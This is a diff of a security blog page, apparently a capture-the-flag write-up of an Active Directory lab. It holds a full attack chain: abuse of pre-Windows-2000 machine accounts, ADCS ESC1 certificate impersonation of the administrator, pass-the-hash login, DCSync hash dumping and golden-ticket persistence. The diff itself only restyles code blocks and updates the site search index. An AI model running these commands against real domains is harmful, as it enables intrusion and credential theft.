 </span></span></code></pre></div><p>As we can see the <code>banking</code> computer is listed as expected.
 <p class="imgp">
@@ -795,7 +795,7 @@ computer account. That one is older than me.</p>
 <li><strong>Export the base DN</strong>:</li>
 </ul>
 <p>For this to work we need to export the DN so we can pass it to <code>ldapsearch</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  <span style="color:#75715e">#First we need to extract the base DN from our domain variable</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  <span style="color:#75715e">#First we need to extract the base DN from our domain variable</span>
 </span></span><span style="display:flex;"><span>  base_dn<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>awk -F. <span style="color:#e6db74">&#39;{for(i=1;i&lt;=NF;i++) printf &#34;DC=%s,&#34;, $i; print &#34;&#34;}&#39;</span> <span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">&#34;</span> | sed <span style="color:#e6db74">&#39;s/,$//&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>  <span style="color:#75715e"># You can also just manually export the values to a var like below</span>
@@ -806,7 +806,7 @@ computer account. That one is older than me.</p>
 <li>
 <p><strong>Run ldap query using <code>ldapsearch</code></strong>:
 Next we run our query</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  ldapsearch -x -H ldap://$box:389 <span style="color:#ae81ff">\
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  ldapsearch -x -H ldap://$box:389 <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>    -D <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">@</span>$domain<span style="color:#e6db74">&#34;</span> -w <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>    -b <span style="color:#e6db74">&#34;</span>$base_dn<span style="color:#e6db74">&#34;</span> -s sub <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>     <span style="color:#e6db74">&#39;(&amp;(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=4096)(userAccountControl:1.2.840.113556.1.4.803:=32))&#39;</span>
@@ -830,7 +830,7 @@ Next we run our query</p>
 <ul>
 <li><strong>Install pre2k and dependencies</strong>:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone https://github.com/garrettfoster13/pre2k.git
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone https://github.com/garrettfoster13/pre2k.git
 </span></span><span style="display:flex;"><span>cd pre2k/
 </span></span><span style="display:flex;"><span>python3 -m venv 2k
 </span></span><span style="display:flex;"><span>source 2k/bin/activate
@@ -838,7 +838,7 @@ Next we run our query</p>
 </span></span></code></pre></div><ul>
 <li><strong>Running pre2k to look for windows machines</strong>:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pre2k auth -u $user -p $pass -d $domain -dc-ip $box
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pre2k auth -u $user -p $pass -d $domain -dc-ip $box
 </span></span></code></pre></div><p>As we can see we get a hit as expected.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-16-125429_.png" alt=""  />
@@ -846,7 +846,7 @@ Next we run our query</p>
 </p>
 <h3 id="validating-banking-password-with-netexec">Validating <code>BANKING$</code> password With <code>netexec</code>:</h3>
 <p>Now we know that that the <code>BANKING$</code> host has the name set as the password let&rsquo;s validate it with netexec.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;BANKING$&#39;</span> -p <span style="color:#e6db74">&#39;banking&#39;</span> --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;BANKING$&#39;</span> -p <span style="color:#e6db74">&#39;banking&#39;</span> --shares
 </span></span></code></pre></div><p>As we can see we get the error <code>STATUS_NOLOGON_WORKSTATION_TRUST</code></p>
 <p>Referring back to the TrustedSec article, we’re told the below.</p>
 <blockquote>
@@ -912,7 +912,7 @@ Next we run our query</p>
  so we can use <code>impacket-changepasswd</code></p>
 <p>+Note+: I am not going to be using the change password method, I am only putting this here for completeness. If you just want to get to root skip to the next section.</p>
 <p>Checking <code>impacket-changepasswd</code> help documents we can see the protocols available to us, let&rsquo;s go with <code>rpc-samr</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-changepasswd $domain/BANKING<span style="color:#ae81ff">\$</span>:banking@$box -newpass StR0ngP@sSw0rd! -p rpc-samr
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-changepasswd $domain/BANKING<span style="color:#ae81ff">\$</span>:banking@$box -newpass StR0ngP@sSw0rd! -p rpc-samr
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Without vars so you can see what is being passed</span>
 </span></span><span style="display:flex;"><span>impacket-changepasswd retro.vl/BANKING$:banking@10.129.234.44 -newpass StR0ngP@sSw0rd! -p rpc-samr
@@ -932,22 +932,22 @@ Next we run our query</p>
 <p>+Note+: In a real engagement this would be the preferred approach to take ownership of this account as we should avoid changing passwords without explicit permission.</p>
 <p>+Box Note+: If you are going to do this yourself you will need to reset the host as the password was just changed and it will not work otherwise.</p>
 <p>First We grab the ticket using <code>impacket-getTGT</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-getTGT $domain/BANKING<span style="color:#ae81ff">\$</span>:banking
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-getTGT $domain/BANKING<span style="color:#ae81ff">\$</span>:banking
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-17-150532_.png">
 </figure>
 
 <p>Then we set the ENV <code>KRB5CCNAME</code> to point to the kerberos ticket:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>./BANKING<span style="color:#ae81ff">\$</span>.ccache
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>./BANKING<span style="color:#ae81ff">\$</span>.ccache
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-17-150616_.png">
 </figure>
 
 <p>Let&rsquo;s validate the ticket works using <code>impacket-smbclient</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-smbclient -k -no-pass $domain/BANKING<span style="color:#ae81ff">\$</span>@DC
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-smbclient -k -no-pass $domain/BANKING<span style="color:#ae81ff">\$</span>@DC
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-17-150645_.png">
 </figure>
 
 <p>We can also use netexec too or any other tool that allows <code>kerberos</code> authentication.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $domain --use-kcache --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $domain --use-kcache --shares
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-17-151428_.png">
 </figure>
 
@@ -960,7 +960,7 @@ ESC1 allows us to request a ticket on behalf of another, often higher privileged
 .</p>
 <h4 id="requesting-a-certificate">Requesting A Certificate:</h4>
 <p>If we run the command below</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad req -k -no-pass -dc-ip $box -target DC.$domain -ca <span style="color:#e6db74">&#39;retro-DC-CA&#39;</span> -template <span style="color:#e6db74">&#39;RetroClients&#39;</span> -upn administrator@$domain -dc-host dc.$domain
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad req -k -no-pass -dc-ip $box -target DC.$domain -ca <span style="color:#e6db74">&#39;retro-DC-CA&#39;</span> -template <span style="color:#e6db74">&#39;RetroClients&#39;</span> -upn administrator@$domain -dc-host dc.$domain
 </span></span></code></pre></div><p>We get can see we get an error telling us the <code>The public key does not meet the minimum size required by the specified certificate template.</code>
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-18-071201_.png" alt=""  />
@@ -979,7 +979,7 @@ We need to pass the argument <code>-key-size [length]</code>, we can also see th
   <img loading="lazy" src="/ox-hugo/2025-09-18-162116_.png" alt=""  />
 </p>
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad req -k -no-pass -dc-ip $box -target DC.$domain -ca <span style="color:#e6db74">&#39;retro-DC-CA&#39;</span> -template <span style="color:#e6db74">&#39;RetroClients&#39;</span> -upn administrator@$domain -dc-host dc.$domain -key-size <span style="color:#ae81ff">4098</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad req -k -no-pass -dc-ip $box -target DC.$domain -ca <span style="color:#e6db74">&#39;retro-DC-CA&#39;</span> -template <span style="color:#e6db74">&#39;RetroClients&#39;</span> -upn administrator@$domain -dc-host dc.$domain -key-size <span style="color:#ae81ff">4098</span>
 </span></span></code></pre></div><p>As we can see we are granted a ticket <code>administrator.pfx</code>
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-18-072522_.png" alt=""  />
@@ -987,7 +987,7 @@ We need to pass the argument <code>-key-size [length]</code>, we can also see th
 </p>
 <h4 id="attempting-to-authenticate-with-the-ticket">Attempting To Authenticate With The Ticket:</h4>
 <p>Now can authenticate with the ticket and get a TGT as the administrator.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> certipy-ad auth -username <span style="color:#e6db74">&#34;administrator&#34;</span> -pfx administrator.pfx -domain $domain -dc-ip $box
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> certipy-ad auth -username <span style="color:#e6db74">&#34;administrator&#34;</span> -pfx administrator.pfx -domain $domain -dc-ip $box
 </span></span></code></pre></div><p>Looks like we have another issue, we have a <code>SID</code> mismatch between the certificate and the administrator user.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-18-072846_.png" alt=""  />
@@ -1001,7 +1001,7 @@ It says to check the wiki so lets do that……well that did not shed any furthe
 </p>
 </p>
 <p>Let&rsquo;s request another certificate this time with the supplied SID and the modified key length.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad req -k -no-pass -dc-ip $box -target DC.$domain -ca <span style="color:#e6db74">&#39;retro-DC-CA&#39;</span> -template <span style="color:#e6db74">&#39;RetroClients&#39;</span> -upn administrator@$domain -dc-host dc.$domain -key-size <span style="color:#ae81ff">4098</span> -sid <span style="color:#e6db74">&#34;S-1-5-21-2983547755-698260136-4283918172-500&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad req -k -no-pass -dc-ip $box -target DC.$domain -ca <span style="color:#e6db74">&#39;retro-DC-CA&#39;</span> -template <span style="color:#e6db74">&#39;RetroClients&#39;</span> -upn administrator@$domain -dc-host dc.$domain -key-size <span style="color:#ae81ff">4098</span> -sid <span style="color:#e6db74">&#34;S-1-5-21-2983547755-698260136-4283918172-500&#34;</span>
 </span></span></code></pre></div><p>We have now have the cert with the administrator <code>SID</code> specified.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-18-073855_.png" alt=""  />
@@ -1009,7 +1009,7 @@ It says to check the wiki so lets do that……well that did not shed any furthe
 </p>
 <h4 id="requesting-a-tgt-with-our-certificate-and-getting-the-administrator-hash">Requesting A TGT With Our Certificate &amp; Getting The Administrator Hash:</h4>
 <p>Now we can use this certificate to request a ticket granting ticket on behalf of the administrator, this will also reveal the administrator&rsquo;s hash.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad auth -username <span style="color:#e6db74">&#34;administrator&#34;</span> -pfx administrator.pfx -domain $domain -dc-ip $box
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad auth -username <span style="color:#e6db74">&#34;administrator&#34;</span> -pfx administrator.pfx -domain $domain -dc-ip $box
 </span></span></code></pre></div><p>It works!
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-18-074038_.png" alt=""  />
@@ -1017,12 +1017,12 @@ It says to check the wiki so lets do that……well that did not shed any furthe
 </p>
 <p>This means we can either authenticate with the hash or the ticket.</p>
 <p>Let&rsquo;s get our root flag using evil-winrm and the hash.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>evil-winrm -i $box -u administrator -H $hash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>evil-winrm -i $box -u administrator -H $hash
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-17-210540_.png">
 </figure>
 
 <p>If we want to use the provided ticket to authenticate with evil-winrm we have to use the below syntax.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>KRB5CCNAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./administrator.ccache&#39;</span> evil-winrm -i dc.$domain -r $domain
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>KRB5CCNAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./administrator.ccache&#39;</span> evil-winrm -i dc.$domain -r $domain
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-18-163254_.png">
 </figure>
 
@@ -1034,21 +1034,21 @@ It says to check the wiki so lets do that……well that did not shed any furthe
 <h2 id="4-dot-persistence">4. Persistence:</h2>
 <h3 id="perform-dcsync-attack-using-netexec">Perform DCSync Attack Using netexec:</h3>
 <p>Now we have the administrator hash lets perform a dcsync attack to dump all other hashes remotely.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -H $hash -M ntdsutil
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -H $hash -M ntdsutil
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-18-074406_.png">
 </figure>
 
 <h3 id="creating-a-kerberos-golden-ticket">Creating a Kerberos Golden Ticket:</h3>
 <p>Let&rsquo;s create a golden ticket so we can always get back in, granted we have administrator ticket.</p>
 <p>Now we will use <code>impacket-secretsdump</code> to retrieve the <code>aeskey</code> of the <code>krbtgt</code> account:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-secretsdump $domain/$user@$box -hashes :$hash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-secretsdump $domain/$user@$box -hashes :$hash
 </span></span></code></pre></div><p>+Note+: I store <code>krbtgt:aes256</code> value in the variable <code>$krbtgt</code> and have also stored the domain sid in <code>$sid</code>
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-18-170838_.png" alt=""  />
 </p>
 </p>
 <p>Now we use <code>impacket-ticketer</code> to create the Golden Ticket:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Using -aeskey</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Using -aeskey</span>
 </span></span><span style="display:flex;"><span>impacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-18-121408_.png">
 </figure>
@@ -1056,9 +1056,9 @@ It says to check the wiki so lets do that……well that did not shed any furthe
 <ul>
 <li>Export the ticket to the* <code>KRB5CCNAME</code> Variable:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>./Administrator.ccache
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>./Administrator.ccache
 </span></span></code></pre></div><p>Let&rsquo;s validate the ticket works by using the ticket for connecting via <code>psexec</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-psexec -k -no-pass $machine.$domain
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-psexec -k -no-pass $machine.$domain
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-18-121433_.png">
 </figure>
 
@@ -1270,6 +1270,13 @@ document.addEventListener("DOMContentLoaded", function() {
 <script>
 window.store = {
     
+    "\/\/uildDrafts:1313\/tags\/ansible\/": {
+        "title": "Ansible",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
+    },
+    
     "\/\/uildDrafts:1313\/author\/": {
         "title": "Author",
         "tags": [],
@@ -1277,11 +1284,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/author\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/blind\/": {
-        "title": "Blind",
+    "\/\/uildDrafts:1313\/tags\/automation\/": {
+        "title": "Automation",
         "tags": [],
         "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
+        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
     },
     
     "\/\/uildDrafts:1313\/author\/bloodstiller\/": {
@@ -1296,6 +1303,55 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
+        "title": "Dotfiles",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/kali\/": {
+        "title": "Kali",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/qemu\/": {
+        "title": "Qemu",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/": {
+        "title": "Security Newsroom Obsidian Plugin Release",
+        "tags": ["kali","automation","qemu","ansible","dotfiles",],
+        "content": "Security Newsroom Obsidian Plugin Release I\u0026rsquo;ve been quiet for a while. Work has been busy \u0026amp; I have been doing some other projects that I can\u0026rsquo;t get into\u0026hellip;\u0026hellip;\nI\u0026rsquo;ve made the switch from my beloved eMacs to obsidian over the last few months and apart from the first week it\u0026rsquo;s been relatively painless. I\u0026rsquo;ve managed to recreate 99% of all eMacs functionality in obsidian (that\u0026rsquo;s functionality I used, not all of eMacs functionality as that would not be possible.)\nOne thing that I have found myself needing is an easy way to keep up with security related news. As the landscape is constantly evolving and growing and there a million different sources to get information from I got bored of jumping around so I thought \u0026ldquo;what if it was just in obsidian\u0026rdquo;. I use obsidian as my web-clipper anyone so let\u0026rsquo;s just put the functionality in here (I say here as I am writing the post in Obsidian)\nSo I decided to create the security newsroom plugin. https://github.com/bloodstiller/obsidian-security-newsroom I\u0026rsquo;ve created a pull request for it to be placed into the official community plugins but so far it has not.\nIt essentially pulls from lots of security resources and allows you to filter, save \u0026amp; clip the whole articles directly within obsidian.\nFull video showing how it works. At the moment as it\u0026rsquo;s not currently approved in the obsidian store if you want to use it you will have to manually add a folder called in your .obsidian/plugins folder called security-newsroom and place the main.js, manifest.json \u0026amp; styles.css from the repo and then load the plugin.\n", 
+        "url": "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/": {
+        "title": "Tags",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/": {
+        "title": "Tools",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tools\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/blind\/": {
+        "title": "Blind",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/ctf-writeup\/": {
@@ -1375,13 +1431,6 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/portswigger\/sqli_lab_15\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/": {
-        "title": "Tags",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/"
-    },
-    
     "\/\/uildDrafts:1313\/tags\/waf\/": {
         "title": "Waf",
         "tags": [],
@@ -1390,7 +1439,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/web-exploitation\/": {
-        "title": "Web-Exploitation",
+        "title": "Web Exploitation",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/web-exploitation\/"
@@ -1803,7 +1852,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/llm\/": {
-        "title": "Llm",
+        "title": "LLM",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/llm\/"
@@ -2258,7 +2307,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/msi\/": {
-        "title": "MSI",
+        "title": "Msi",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/msi\/"
@@ -2654,13 +2703,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/tools\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tools\/": {
-        "title": "Tools",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tools\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/vulnerability-assessment\/": {
@@ -3112,7 +3154,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/ssrf\/": {
-        "title": "Ssrf",
+        "title": "SSRF",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/ssrf\/"
@@ -3622,46 +3664,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/homelab\/20250220118-nixos-homelab\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/ansible\/": {
-        "title": "Ansible",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
-    },
-    
     "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/": {
         "title": "Automating Kali Linux VM Setup: A Comprehensive Guide to QEMU and Ansible Integration",
         "tags": ["kali","automation","qemu","ansible","dotfiles",],
         "content": "As a cybersecurity enthusiast and productivity junkie, I\u0026rsquo;ve always been fascinated by the power of automation. Recently, I decided to streamline my process of setting up Kali Linux virtual machines using QEMU and Ansible. In this article, I\u0026rsquo;ll walk you through how I\u0026rsquo;ve automated the creation and configuration of Kali VMs, complete with my preferred dotfiles and tools.\nThe Need for Automation If you\u0026rsquo;re like me, you probably find yourself creating new Kali VMs frequently for various projects or testing environments. The process of setting up a new VM, updating the system, installing your favorite tools, and configuring your environment can be time-consuming and repetitive. That\u0026rsquo;s where automation comes in handy. You can repurpose this setup for other projects, just change the Ansible playbook and dotfiles.\nBenefits and Challenges This automation setup offers several advantages:\nConsistent environment across all VMs Rapid deployment of new instances Version-controlled configuration (infrastructure as code) Easy sharing and collaboration Some challenges I encountered:\nVirtioFS setup complexity Ansible role organization Package version management Dotfiles synchronization But the benefits far outweigh the initial setup effort.\nPrerequisites Choose your preferred virtualization provider:\nVirtualBox Setup VirtualBox Vagrant 